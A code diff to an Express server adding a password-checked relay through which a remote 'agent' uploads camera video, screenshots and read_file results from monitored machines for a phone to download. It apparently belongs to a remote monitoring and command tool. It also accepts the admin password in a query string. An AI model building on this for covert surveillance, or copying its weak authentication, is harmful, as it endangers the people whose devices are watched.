@@ -132,6 +132,44 @@ app.post(['/api/config/status', '/api/device-status'], (req, res) => {
   if (isBlocked(deviceId)) return res.status(403).json({ success: false, error: 'Device is still blocked', deviceBlocked: true });
   res.json({ success: true, message: 'Device is allowed', deviceBlocked: false });
 });
+// ── big-payload relay (camera video, screenshots, read_file) ─────────────
+// The agent uploads large results over HTTP here (WebSocket frames cap out)
+// and the phone downloads them by ref. Public routes: agent-side, password-
+// checked — same ADMIN_PASSWORD shared by the agent token.
+const uploadedFiles = new Map(); // ref -> {file, size, mime, name, at}
+const UPLOAD_DIR = path.join(APP_DIR, 'uploads');
+try { fs.mkdirSync(UPLOAD_DIR, { recursive: true }); } catch (e) {}
+
+function adminPasswordOk(req) {
+  return String(req.headers['x-admin-password'] || req.query.password || '') === ADMIN_PASSWORD;
+}
+
+app.post('/api/agent/upload', express.raw({ type: '*/*', limit: '400mb' }), (req, res) => {
+  if (!adminPasswordOk(req)) return res.status(403).json({ success: false, error: 'Invalid admin password' });
+  const buf = req.body;
+  if (!Buffer.isBuffer(buf) || buf.length === 0) return res.status(400).json({ success: false, error: 'Empty upload' });
+  const ref = crypto.randomBytes(12).toString('hex');
+  const file = path.join(UPLOAD_DIR, ref);
+  try { fs.writeFileSync(file, buf); } catch (e) { return res.status(500).json({ success: false, error: e.message }); }
+  const name = String(req.headers['x-filename'] || 'payload.bin').replace(/[^A-Za-z0-9._-]/g, '_');
+  const mime = String(req.headers['x-mime'] || 'application/octet-stream');
+  uploadedFiles.set(ref, { file, size: buf.length, mime, name: name.replace(/\.[^.]*$/, ''), ext: (name.split('.').pop() || 'bin'), at: Date.now() });
+  console.log('[UPLOAD] ref=' + ref + ' bytes=' + buf.length + ' mime=' + mime);
+  res.json({ success: true, ref, size: buf.length });
+});
+
+app.get(['/api/file/:ref', '/api/upload/:ref'], (req, res) => {
+  if (!adminPasswordOk(req)) return res.status(403).json({ success: false, error: 'Invalid admin password' });
+  const meta = uploadedFiles.get(String(req.params.ref || ''));
+  if (!meta) return res.status(404).json({ success: false, error: 'Unknown ref' });
+  try {
+    const ext = '.' + (meta.ext === 'bin' ? 'bin' : meta.ext);
+    res.setHeader('Content-Type', meta.mime || 'application/octet-stream');
+    res.setHeader('Content-Disposition', `attachment; filename="${meta.name}${ext}"`);
+    fs.createReadStream(meta.file).pipe(res);
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
 app.use(requireAuth);
 app.use(express.static(path.join(APP_DIR, 'dashboard'), { index: false }));
 app.get('/', (req, res) => res.sendFile(path.join(APP_DIR, 'dashboard', 'index.html')));
@@ -354,7 +392,12 @@ app.post('/api/monitor/:machineName/command', async (req, res) => {
       success: true,
       output: result.output || '',
       data: result.data || null,
-      exitCode: result.exitCode === undefined ? 0 : result.exitCode
+      exitCode: result.exitCode === undefined ? 0 : result.exitCode,
+      // Set when the agent uploaded a big payload (camera video etc.) over
+      // HTTP instead of the WebSocket — download via /api/file/:ref
+      ref: result.ref || undefined,
+      filename: result.filename || undefined,
+      mime: result.mime || undefined
     });
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
